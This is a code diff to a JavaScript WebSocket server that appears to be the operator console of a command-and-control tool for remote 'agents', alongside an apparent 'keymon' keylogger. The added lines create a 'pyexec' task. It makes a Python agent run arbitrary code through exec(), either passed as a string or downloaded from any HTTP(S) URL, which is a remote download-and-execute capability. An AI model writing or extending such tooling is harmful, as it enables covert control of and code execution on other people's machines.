@@ -138,6 +138,9 @@ export const setupWS = (httpServer) => {
               }else{
                 agentHelp["kbdfile <file>"] = "Change the event file used by keymon";
               }
+            }else if (agent.agentType === 1){ // The python agent
+              agentHelp["pyexec <str>"] = "Execute given string as python code using exec()";
+              agentHelp["pyexec -u <url>"] = "Load python code from URL and execute using exec()";
             }
             let cmds = Object.keys(agentHelp).sort();
             let maxLen = 0;
@@ -286,6 +289,20 @@ export const setupWS = (httpServer) => {
             taskModel.createTask(username, {
               agentID, taskType: "kbdfile", data: {file}
             });
+          }else if (input.startsWith("pyexec ")){
+            let code = input.substr(7).trim();
+            if (code.startsWith("-u ")){
+              let url = code.substr(3).trim();
+              if (!(url.startsWith("http://") || url.startsWith("https://")))
+                throw new Error("Only HTTP(s) URLs are supported by pyexec!");
+              taskModel.createTask(username, {
+                agentID, taskType: "pyexec-web", data: {url}
+              });
+            }else{
+              taskModel.createTask(username, {
+                agentID, taskType: "pyexec", data: {code: code}
+              });
+            }
           }else if (input === "abort"){
             taskModel.createTask(username, {
               agentID, taskType: "abort"
